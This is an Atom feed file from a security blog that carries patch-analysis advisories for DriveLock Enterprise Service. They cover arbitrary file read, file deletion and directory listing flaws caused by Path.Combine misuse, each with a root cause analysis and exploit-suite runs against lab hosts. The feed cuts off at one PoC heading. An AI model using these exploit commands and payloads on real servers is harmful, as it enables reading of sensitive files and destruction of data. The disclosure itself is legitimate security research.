@@ -1,0 +1,1123 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2026-03-02T04:19:35+00:00</updated><id>/feed.xml</id><title type="html">Red vs. Blue Shell</title><subtitle>Posts about IT Security, pentesting and bug bounty hunting.</subtitle><entry><title type="html">[PatchAnalysis - DriveLock] DriveLock Enterprise Service 25.2.4 hidden vulnerabilites</title><link href="/advisory/2026/03/02/drivelock-patch-analysis.html" rel="alternate" type="text/html" title="[PatchAnalysis - DriveLock] DriveLock Enterprise Service 25.2.4 hidden vulnerabilites" /><published>2026-03-02T00:00:00+00:00</published><updated>2026-03-02T00:00:00+00:00</updated><id>/advisory/2026/03/02/drivelock-patch-analysis</id><content type="html" xml:base="/advisory/2026/03/02/drivelock-patch-analysis.html"><![CDATA[<p>As the <code class="language-plaintext highlighter-rouge">DriveLock Enterprise Service</code> version <code class="language-plaintext highlighter-rouge">25.2.4.62569</code> released on <code class="language-plaintext highlighter-rouge">2026-02-20</code> includes patches for other vulnerabilites I submitted to the vendor - <code class="language-plaintext highlighter-rouge">ZDI-CAN-28726</code>, <code class="language-plaintext highlighter-rouge">ZDI-CAN-28713 / ZDI-CAN-28722 / ZDI-CAN-28746</code>, <code class="language-plaintext highlighter-rouge">ZDI-CAN-28719</code> - I did a patch analysis if the applied mitigations can be bypassed somehow.</p>
+
+<p>At a first glance it seems that the patches can not be bypassed.</p>
+
+<p>But having a closer look at the patch-diff reveleaed that the patch also closes security vulnerabilites not mentioned on the <a href="https://www.drivelock.help/versions/2025_2/web/en/releasenotes/Content/ReleaseNotes_DriveLock/BugFixes/NeueBugFixes2025-2PA2.htm">patch notes</a>.</p>
+
+<p>This post gives you an overview about these silently patched vulnerabilites and a working <code class="language-plaintext highlighter-rouge">Proof of Concept</code>.</p>
+
+<h1 id="timeline">Timeline</h1>
+
+<ul>
+  <li>2026-02-20: DriveLock Enterprise Service, Version 25.2.4 release</li>
+</ul>]]></content><author><name></name></author><category term="advisory" /><summary type="html"><![CDATA[As the DriveLock Enterprise Service version 25.2.4.62569 released on 2026-02-20 includes patches for other vulnerabilites I submitted to the vendor - ZDI-CAN-28726, ZDI-CAN-28713 / ZDI-CAN-28722 / ZDI-CAN-28746, ZDI-CAN-28719 - I did a patch analysis if the applied mitigations can be bypassed somehow.]]></summary></entry><entry><title type="html">[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Local File Inclusion, diagnosticFetchFile</title><link href="/patch%20analysis/2026/03/01/dl-DES-LFI-diagnosticFetchFile.html" rel="alternate" type="text/html" title="[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Local File Inclusion, diagnosticFetchFile" /><published>2026-03-01T00:00:00+00:00</published><updated>2026-03-01T00:00:00+00:00</updated><id>/patch%20analysis/2026/03/01/dl-DES-LFI-diagnosticFetchFile</id><content type="html" xml:base="/patch%20analysis/2026/03/01/dl-DES-LFI-diagnosticFetchFile.html"><![CDATA[<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>This platform includes the <code class="language-plaintext highlighter-rouge">DriveLock Core</code> component, which is an agent installed on the client machines.</p>
+
+<h1 id="overview">Overview</h1>
+<p>It is possible to download any file from the servers filesystem as a logon user with <code class="language-plaintext highlighter-rouge">Infrastructure_Manage</code> permissions. The server does not properly validate the user provided input.</p>
+
+<p><strong>Privileges Required</strong></p>
+<ul>
+  <li>User required: <code class="language-plaintext highlighter-rouge">true</code></li>
+  <li>Permission: <code class="language-plaintext highlighter-rouge">PermissionType.Infrastructure_Manage</code></li>
+</ul>
+
+<h2 id="impact">Impact</h2>
+<p>An attacker can access sensitive data stored on the servers filesystem.</p>
+
+<h1 id="root-cause-analysis">Root Cause Analysis</h1>
+<p>The endpoint <code class="language-plaintext highlighter-rouge">/api/administration/infrastructure/diagnosticFetchFile</code> accepts different path parameters. One of them is the <code class="language-plaintext highlighter-rouge">subFolderAndFile</code> parameter, which is used to build the full path of the file to download.</p>
+
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// FILE - DriveLock.EnterpriseServer.ServiceBroker/DriveLock.EnterpriseServer.ServiceBroker/DiagnosticFileHandling.cs</span>
+<span class="n">FUNCTION</span> <span class="nf">FetchFile</span><span class="p">(</span><span class="n">OUT</span> <span class="n">data</span><span class="p">,</span> <span class="n">folderId</span><span class="p">,</span> <span class="n">pathAndFile</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">count</span><span class="p">):</span>
+
+    <span class="c1">// 1. Resolve known folder</span>
+    <span class="n">knownFolder</span> <span class="p">=</span> <span class="nf">GetKnownFolder</span><span class="p">(</span><span class="n">folderId</span><span class="p">)</span>
+    <span class="n">IF</span> <span class="n">knownFolder</span> <span class="n">IS</span> <span class="n">NULL</span> <span class="n">OR</span> <span class="n">EMPTY</span> <span class="n">THEN</span>
+        <span class="n">data</span> <span class="p">=</span> <span class="n">NULL</span>
+        <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="s">"Unknown folder"</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+    <span class="c1">// 2. Prevent path traversal</span>
+    <span class="n">IF</span> <span class="n">pathAndFile</span> <span class="n">CONTAINS</span> <span class="s">".."</span> <span class="n">THEN</span>
+        <span class="n">data</span> <span class="p">=</span> <span class="n">NULL</span>
+        <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="s">"Not allowed subfolder"</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+    <span class="c1">// 3. Handle empty read request</span>
+    <span class="n">IF</span> <span class="n">count</span> <span class="p">==</span> <span class="m">0</span> <span class="n">THEN</span>
+        <span class="n">data</span> <span class="p">=</span> <span class="n">NEW</span> <span class="nf">BYTE_ARRAY</span><span class="p">(</span><span class="n">size</span> <span class="p">=</span> <span class="m">0</span><span class="p">)</span>
+        <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">true</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+
+    <span class="n">TRY</span>
+        <span class="c1">// 4. Build full file path</span>
+        <span class="n">fullPath</span> <span class="p">=</span> <span class="nf">CombinePath</span><span class="p">(</span><span class="n">knownFolder</span><span class="p">,</span> <span class="n">pathAndFile</span><span class="p">)</span>
+        <span class="c1">// 5. Ensure file exists</span>
+        <span class="n">IF</span> <span class="nf">FileExists</span><span class="p">(</span><span class="n">fullPath</span><span class="p">)</span> <span class="n">IS</span> <span class="n">FALSE</span> <span class="n">THEN</span>
+            <span class="n">data</span> <span class="p">=</span> <span class="n">NULL</span>
+            <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="s">"File '"</span> <span class="p">+</span> <span class="n">fullPath</span> <span class="p">+</span> <span class="s">"' does not exist"</span><span class="p">)</span>
+        <span class="n">END</span> <span class="n">IF</span>
+        <span class="n">data</span> <span class="p">=</span> <span class="nf">ReadBytesFromFile</span><span class="p">(</span><span class="n">fullPath</span><span class="p">,</span> <span class="n">startPosition</span> <span class="p">=</span> <span class="n">pos</span><span class="p">,</span> <span class="n">length</span> <span class="p">=</span> <span class="n">count</span><span class="p">)</span>
+
+    <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">true</span><span class="p">)</span>
+<span class="n">END</span> <span class="n">FUNCTION</span>
+
+</code></pre></div></div>
+
+<p>As shown above the <code class="language-plaintext highlighter-rouge">pathAndFile</code> (<code class="language-plaintext highlighter-rouge">subFolderAndFile</code> in the route definition) parameter is validated and a check is performed that it does not include <code class="language-plaintext highlighter-rouge">..</code>  to move up to a parent directory. Thus the value <code class="language-plaintext highlighter-rouge">./../../../../windows/win.ini</code> would be rejected. But it does not test if the provided path is a full qualified path like <code class="language-plaintext highlighter-rouge">C:\windows\win.ini</code>.</p>
+
+<p>This lack of validation can be exploit, because the function <code class="language-plaintext highlighter-rouge">Path.Combine</code> is used to construct the full path - <code class="language-plaintext highlighter-rouge">string text = Path.Combine(knownFolder, pathAndFile);</code>.</p>
+
+<p>As the documentation states:</p>
+
+<blockquote>
+  <p><strong>Important</strong>
+This method assumes that the first argument is an absolute path and that the following argument or arguments are relative paths. If this is not the case, and particularly if any subsequent arguments are strings input by the user, call the Join or TryJoin method instead.</p>
+</blockquote>
+
+<p><strong>CITE: https://learn.microsoft.com/en-us/dotnet/api/system.io.path.combine?view=net-10.0</strong></p>
+
+<p>if any of the parts is absolute, this is used as the new base.</p>
+
+<p>For example:</p>
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="s">"C:\\temp\\foobar"</span><span class="p">,</span> <span class="s">"message.txt"</span><span class="p">);</span> <span class="c1">// --&gt; C:\temp\foobar\message.txt</span>
+<span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="s">"C:\\temp\\foobar"</span><span class="p">,</span> <span class="s">"C:\\windows\\message.txt"</span><span class="p">);</span> <span class="c1">// --&gt; C:\\windows\\message.txt</span>
+</code></pre></div></div>
+
+<h1 id="proof-of-concept--exploit">Proof of Concept / Exploit</h1>
+<p>Setup <code class="language-plaintext highlighter-rouge">JWT</code>, <code class="language-plaintext highlighter-rouge">DES_NAME</code> environment var and run the included <a href="/assets/drivelock/poc/poc-lfi-webUI-diagnosticFetchFile.sh">PoC - webUI-diagnosticFetchFile</a>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">export </span><span class="nv">JWT</span><span class="o">=</span><span class="s2">"XXX"</span>
+❯ <span class="nb">export </span><span class="nv">DES_NAME</span><span class="o">=</span><span class="s2">"XXX"</span>
+❯ ./poc-lfi-webUI-diagnosticFetchFile.sh
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+<p>The following demonstrates the usage of the exploit suite:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ uv run <span class="nt">-m</span> drivelock.exploit <span class="nt">-t</span> doetess <span class="nt">-u</span> stuxxn <span class="nt">-P</span> <span class="s1">'!23456Qwertz'</span> lfi diagnosticFetchFile packer-win2019.pentest.lab <span class="s1">'C:/windows/win.ini'</span>
+<span class="o">[</span>INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/auth/login
+<span class="o">[</span>INFO] Login as - tenant: doetess, user: stuxxn
+<span class="o">[</span>INFO] Setup JWT <span class="k">for </span>http.client
+<span class="o">[</span>DEBUG] Token: XXX
+<span class="o">[</span>INFO] Trying to download file: C:<span class="se">\w</span>indows<span class="se">\w</span><span class="k">in</span>.ini
+<span class="o">[</span>INFO] URL: https://des-25-2-2.pentest.lab:4568/api/administration/infrastructure/diagnosticFetchFile/packer-win2019.pentest.lab/1/C:<span class="se">\w</span>indows<span class="se">\w</span><span class="k">in</span>.ini/5242880
+File content:
+b<span class="s1">'; for 16-bit app support\r\n[fonts]\r\n[extensions]\r\n[mci extensions]\r\n[files]\r\n[Mail]\r\nMAPI=1\r\n'</span>
+
+</code></pre></div></div>
+
+<p>To get the <code class="language-plaintext highlighter-rouge">DES</code> name, required for the exploit, use the <code class="language-plaintext highlighter-rouge">/api/administration/infrastructure/listDes</code> endpoint.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/administration/infrastructure/listDes</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.60.10:4568</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer XXX</span>
+<span class="na">Lang</span><span class="p">:</span> <span class="s">en</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://192.168.60.10:4568</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">empty</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">cors</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
+
+</code></pre></div></div>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"servers"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"desName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"packer-win2019.pentest.lab"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"desType"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"httpAddress"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://packer-win2019.pentest.lab:6067"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"tenant"</span><span class="p">:</span><span class="w"> </span><span class="s2">"root"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="solution">Solution</h1>
+<p>Patch for version 25.2, 25.1 and 24.2 were published on 2026-02-20, which fixes the vulnerability.
+Patched versions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>25.2.4
+25.1.7
+24.2.9
+</code></pre></div></div>
+
+<p>No other mitigations are known.</p>]]></content><author><name></name></author><category term="patch analysis" /><summary type="html"><![CDATA[Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked.]]></summary></entry><entry><title type="html">[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Delete arbitrary files</title><link href="/patch%20analysis/2026/03/01/dl-DES-arbitrary-delete.html" rel="alternate" type="text/html" title="[PatchAnalysis - DriveLock] DriveLock Enterprise Service - Delete arbitrary files" /><published>2026-03-01T00:00:00+00:00</published><updated>2026-03-01T00:00:00+00:00</updated><id>/patch%20analysis/2026/03/01/dl-DES-arbitrary-delete</id><content type="html" xml:base="/patch%20analysis/2026/03/01/dl-DES-arbitrary-delete.html"><![CDATA[<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>This platform includes the <code class="language-plaintext highlighter-rouge">DriveLock Core</code> component, which is an agent installed on the client machines.</p>
+
+<h2 id="overview--impact">Overview / Impact</h2>
+<p>An attacker can force the <code class="language-plaintext highlighter-rouge">DES</code> to delete arbitrary files on the filesystem, by using the <code class="language-plaintext highlighter-rouge">traces</code> API endpoint.</p>
+
+<p><strong>Privileges Required</strong></p>
+<ul>
+  <li>User required: <code class="language-plaintext highlighter-rouge">true</code></li>
+  <li>Permission: <code class="language-plaintext highlighter-rouge">PermissionType.TraceFiles_Write</code></li>
+</ul>
+
+<h1 id="root-cause-analysis">Root Cause Analysis</h1>
+<p>The implementation of the <code class="language-plaintext highlighter-rouge">delete traces</code> endpoint <code class="language-plaintext highlighter-rouge">/api/administration/traceFiles/traces</code> uses the user provided data without sanitizing / validating it.
+The value <code class="language-plaintext highlighter-rouge">request.TraceFiles[].name</code> is passed to the <code class="language-plaintext highlighter-rouge">Path.Combine</code> function to build the full path for the file which should be deleted. After building the path it is used in <code class="language-plaintext highlighter-rouge">System.IO.File.Delete</code> without further validation.</p>
+
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// FILE: EnterpriseServer.Administration/EnterpriseServer.Administration.Controller/TraceFilesController.cs</span>
+
+<span class="n">FUNCTION</span> <span class="nf">DeleteTraceFiles</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+
+    <span class="c1">// 1. Check permissions</span>
+    <span class="nf">EnsureUserHasPermission</span><span class="p">(</span><span class="s">"TraceFiles_Write"</span><span class="p">,</span> <span class="s">"Delete TraceFiles"</span><span class="p">)</span>
+    <span class="c1">// 2. Validate input</span>
+    <span class="n">IF</span> <span class="n">request</span> <span class="n">IS</span> <span class="n">NULL</span> <span class="n">OR</span> <span class="n">request</span><span class="p">.</span><span class="n">TraceFiles</span> <span class="n">IS</span> <span class="n">NULL</span> <span class="n">THEN</span>
+        <span class="n">RETURN</span> <span class="nf">BadRequest</span><span class="p">(</span><span class="s">"No traces given"</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+    <span class="c1">// 3. Process each trace file</span>
+    <span class="n">FOR</span> <span class="n">EACH</span> <span class="n">traceFile</span> <span class="n">IN</span> <span class="n">request</span><span class="p">.</span><span class="n">TraceFiles</span> <span class="n">DO</span>
+        <span class="n">basePath</span> <span class="p">=</span> <span class="nf">GetPathForLocalTraces</span><span class="p">(</span>
+                        <span class="nf">CurrentTenantFromToken</span><span class="p">(),</span>
+                        <span class="n">traceFile</span><span class="p">.</span><span class="n">Computer</span>
+                    <span class="p">)</span>
+        <span class="n">fullPath</span> <span class="p">=</span> <span class="nf">CombinePath</span><span class="p">(</span><span class="n">basePath</span><span class="p">,</span> <span class="n">traceFile</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span>
+
+        <span class="n">IF</span> <span class="nf">FileExists</span><span class="p">(</span><span class="n">fullPath</span><span class="p">)</span> <span class="n">THEN</span>
+            <span class="nf">DeleteFile</span><span class="p">(</span><span class="n">fullPath</span><span class="p">)</span>
+        <span class="n">END</span> <span class="n">IF</span>
+    <span class="n">END</span> <span class="n">FOR</span>
+    <span class="c1">// 4. Return success</span>
+    <span class="n">RETURN</span> <span class="nf">Ok</span><span class="p">()</span>
+
+<span class="n">END</span> <span class="n">FUNCTION</span>
+</code></pre></div></div>
+
+<h1 id="proof-of-concept--exploit">Proof of Concept / Exploit</h1>
+<p>Setup <code class="language-plaintext highlighter-rouge">JWT</code> environment var and run the included <a href="/assets/drivelock/poc/poc-arbitrary-delete.sh">PoC - arbitrary-delete</a>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">export </span><span class="nv">JWT</span><span class="o">=</span><span class="s2">"XXX"</span>
+❯ ./poc-arbitrary-delete.sh
+</code></pre></div></div>
+
+<h2 id="exploit">Exploit</h2>
+<p>The following demonstrates the usage of the exploit suite.</p>
+
+<p>Pre-setup: create a file which can be deleted by the configured <code class="language-plaintext highlighter-rouge">DES</code> service user - eg. <code class="language-plaintext highlighter-rouge">drivelock.svc</code>.</p>
+<pre><code class="language-ps1">PS C:\temp&gt; New-Item foobar.txt
+    Directory: C:\temp
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/3/2025   9:33 AM              0 foobar.txt
+
+
+PS C:\temp&gt; icacls "foobar.txt" /grant "Users:(F)" /T
+processed file: foobar.txt
+Successfully processed 1 files; Failed processing 0 files
+PS C:\temp&gt; ls
+    Directory: C:\temp
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        12/3/2025   9:33 AM              0 foobar.txt
+-a----        11/3/2025   8:54 PM     1426724864 SQLServer2019-x64-ENU-Dev.iso
+-a----        11/3/2025   9:11 PM      495847104 SSMS-Setup-ENU.exe
+
+</code></pre>
+
+<p>Running the exploit:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ uv run <span class="nt">-m</span> drivelock.exploit <span class="nt">--tenant</span> doetess <span class="nt">-u</span> stuxxn <span class="nt">-P</span> <span class="s1">'!23456Qwertz'</span> deleteFile <span class="s1">'C:\\temp\\foobar.txt'</span>
+<span class="o">[</span>INFO] URL: https://192.168.60.10:4568/api/administration/auth/login
+<span class="o">[</span>INFO] Login as - tenant: doetess, user: stuxxn
+<span class="o">[</span>INFO] Setup JWT <span class="k">for </span>http.client
+<span class="o">[</span>DEBUG] Token: XXX
+<span class="o">[</span>INFO] URL: https://192.168.60.10:4568/api/administration/traceFiles/traces
+<span class="o">[</span>INFO] Payload: <span class="o">{</span><span class="s1">'TraceFiles'</span>: <span class="o">[{</span><span class="s1">'computer'</span>: <span class="s1">''</span>, <span class="s1">'name'</span>: <span class="s1">'C:\\temp\\foobar.txt'</span><span class="o">}]}</span>
+</code></pre></div></div>
+
+<pre><code class="language-ps1">PS C:\temp&gt; # After running the exploit
+PS C:\temp&gt; ls
+    Directory: C:\temp
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        11/3/2025   8:54 PM     1426724864 SQLServer2019-x64-ENU-Dev.iso
+-a----        11/3/2025   9:11 PM      495847104 SSMS-Setup-ENU.exe
+</code></pre>
+
+<h1 id="solution">Solution</h1>
+<p>Patch for version 25.2, 25.1 and 24.2 were published on 2026-02-20, which fixes the vulnerability.
+Patched versions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>25.2.4
+25.1.7
+24.2.9
+</code></pre></div></div>
+
+<p>No other mitigations are known.</p>]]></content><author><name></name></author><category term="patch analysis" /><summary type="html"><![CDATA[Product description The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside. This means you are secure at the centre, with all paths of access to your sensitive data blocked.]]></summary></entry><entry><title type="html">[PatchAnalysis - DriveLock] DriveLock Enterprise Service - List folder content</title><link href="/patch%20analysis/2026/03/01/dl-DES-directory-listing.html" rel="alternate" type="text/html" title="[PatchAnalysis - DriveLock] DriveLock Enterprise Service - List folder content" /><published>2026-03-01T00:00:00+00:00</published><updated>2026-03-01T00:00:00+00:00</updated><id>/patch%20analysis/2026/03/01/dl-DES-directory-listing</id><content type="html" xml:base="/patch%20analysis/2026/03/01/dl-DES-directory-listing.html"><![CDATA[<h1 id="product-description">Product description</h1>
+<blockquote>
+  <p>The HYPERSECURE Endpoint Protection Platform ensures that attacks on IT systems are kept where they belong: outside.
+This means you are secure at the centre, with all paths of access to your sensitive data blocked.</p>
+</blockquote>
+
+<p><em>Cite: <a href="https://www.drivelock.com/en/">DriveLock - Homepage</a></em></p>
+
+<p>This platform includes the <code class="language-plaintext highlighter-rouge">DriveLock Core</code> component, which is an agent installed on the client machines.</p>
+
+<h1 id="overview">Overview</h1>
+<p>There is a endpoint, which is used to list the content of a local folder on the filesystem of the <code class="language-plaintext highlighter-rouge">DES</code>. This is used to show all available log files in the <code class="language-plaintext highlighter-rouge">https://192.168.60.10:4568/ui/app/settings/serverSettings</code> -&gt; <code class="language-plaintext highlighter-rouge">LogFiles</code> UI. As the provided path is not fully validated it is possible to break out of the predefined folder and list the content of any folder on the system.</p>
+
+<p><strong>Privileges Required</strong></p>
+<ul>
+  <li>User required: <code class="language-plaintext highlighter-rouge">true</code></li>
+  <li>Permission: <code class="language-plaintext highlighter-rouge">PermissionType.Infrastructure_Manage</code></li>
+</ul>
+
+<h2 id="impact">Impact</h2>
+<p>This vulnerability alone does only leak information about the local system. But it can be used in combination with any of the <code class="language-plaintext highlighter-rouge">local file inclusion</code> vulnerabilities to search the system for sensitive data and access them afterward.</p>
+
+<h1 id="root-cause-analysis">Root Cause Analysis</h1>
+<p>The endpoint <code class="language-plaintext highlighter-rouge">/api/administration/infrastructure/diagnosticFileListing</code> accepts three path parameters. One of them is the <code class="language-plaintext highlighter-rouge">subFolder</code> parameter, which is used to build the full path of the folder to list the content.</p>
+
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// FILE - DriveLock.EnterpriseServer.ServiceBroker/DriveLock.EnterpriseServer.ServiceBroker/DiagnosticFileHandling.cs</span>
+
+<span class="n">FUNCTION</span> <span class="nf">FileListing</span><span class="p">(</span><span class="n">OUT</span> <span class="n">content</span><span class="p">,</span> <span class="n">folderId</span><span class="p">,</span> <span class="n">subFolder</span><span class="p">):</span>
+
+    <span class="c1">// 1. Resolve known folder</span>
+    <span class="n">knownFolder</span> <span class="p">=</span> <span class="nf">GetKnownFolder</span><span class="p">(</span><span class="n">folderId</span><span class="p">)</span>
+
+    <span class="n">IF</span> <span class="n">knownFolder</span> <span class="n">IS</span> <span class="n">NULL</span> <span class="n">OR</span> <span class="n">EMPTY</span> <span class="n">THEN</span>
+        <span class="n">content</span> <span class="p">=</span> <span class="n">NULL</span>
+        <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="s">"Unknown folder"</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+
+    <span class="c1">// 2. Normalize subfolder</span>
+    <span class="n">IF</span> <span class="n">subFolder</span> <span class="n">IS</span> <span class="n">NULL</span> <span class="n">THEN</span>
+        <span class="n">subFolder</span> <span class="p">=</span> <span class="n">EMPTY_STRING</span>
+    <span class="n">END</span> <span class="n">IF</span>
+
+    <span class="c1">// 3. Prevent path traversal</span>
+    <span class="n">IF</span> <span class="n">subFolder</span> <span class="n">CONTAINS</span> <span class="s">".."</span> <span class="n">THEN</span>
+        <span class="n">content</span> <span class="p">=</span> <span class="n">NULL</span>
+        <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="s">"Not allowed subfolder"</span><span class="p">)</span>
+    <span class="n">END</span> <span class="n">IF</span>
+
+    <span class="n">TRY</span>
+        <span class="c1">// 4. Prepare result container</span>
+        <span class="n">content</span> <span class="p">=</span> <span class="n">NEW</span> <span class="nf">DirectoryContent</span><span class="p">()</span>
+        <span class="c1">// 5. Build target path</span>
+        <span class="n">targetPath</span> <span class="p">=</span> <span class="nf">CombinePath</span><span class="p">(</span><span class="n">knownFolder</span><span class="p">,</span> <span class="n">subFolder</span><span class="p">)</span>
+        <span class="c1">// 6. Ensure directory exists</span>
+        <span class="n">IF</span> <span class="nf">DirectoryExists</span><span class="p">(</span><span class="n">targetPath</span><span class="p">)</span> <span class="n">IS</span> <span class="n">FALSE</span> <span class="n">THEN</span>
+            <span class="n">RETURN</span> <span class="nf">Result</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="s">"Directory '"</span> <span class="p">+</span> <span class="n">targetPath</span> <span class="p">+</span> <span class="s">"' does not exist"</span><span class="p">)</span>
+        <span class="n">END</span> <span class="n">IF</span>
+
+        <span class="c1">// 7. Read directory entries</span>
+        <span class="n">entries</span> <span class="p">=</span> <span class="nf">GetFileSystemEntries</span><span class="p">(</span><span class="n">targetPath</span><span class="p">)</span>
+
+        <span class="n">FOR</span> <span class="n">EACH</span> <span class="n">entry</span> <span class="n">IN</span> <span class="n">entries</span> <span class="n">DO</span>
+        <span class="c1">// ....</span>
+</code></pre></div></div>
+
+<p>As shown above the <code class="language-plaintext highlighter-rouge">subFolder</code> parameter is validated and a check is performed that it does not include <code class="language-plaintext highlighter-rouge">..</code>  to move up to a parent directory. Thus the value <code class="language-plaintext highlighter-rouge">./../../../../windows</code> would be rejected. But it does not test if the provided path is a full qualified path like <code class="language-plaintext highlighter-rouge">C:\windows</code>.</p>
+
+<p>This lack of validation can be exploit, because the function <code class="language-plaintext highlighter-rouge">Path.Combine</code> is used to construct the full path - <code class="language-plaintext highlighter-rouge">string text = Path.Combine(knownFolder, subFolder);</code>.</p>
+
+<p>As the documentation states:</p>
+
+<blockquote>
+  <p><strong>Important</strong>
+This method assumes that the first argument is an absolute path and that the following argument or arguments are relative paths. If this is not the case, and particularly if any subsequent arguments are strings input by the user, call the Join or TryJoin method instead.</p>
+</blockquote>
+
+<p><strong>CITE: https://learn.microsoft.com/en-us/dotnet/api/system.io.path.combine?view=net-10.0</strong></p>
+
+<p>if any of the parts is absolute, this is used as the new base.</p>
+
+<p>For example:</p>
+<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="s">"C:\\temp\\foobar"</span><span class="p">,</span> <span class="s">"message.txt"</span><span class="p">);</span> <span class="c1">// --&gt; C:\temp\foobar\message.txt</span>
+<span class="n">Path</span><span class="p">.</span><span class="nf">Combine</span><span class="p">(</span><span class="s">"C:\\temp\\foobar"</span><span class="p">,</span> <span class="s">"C:\\windows\\message.txt"</span><span class="p">);</span> <span class="c1">// --&gt; C:\\windows\\message.txt</span>
+</code></pre></div></div>
+
+<h1 id="proof-of-concept--exploit">Proof of Concept / Exploit</h1>
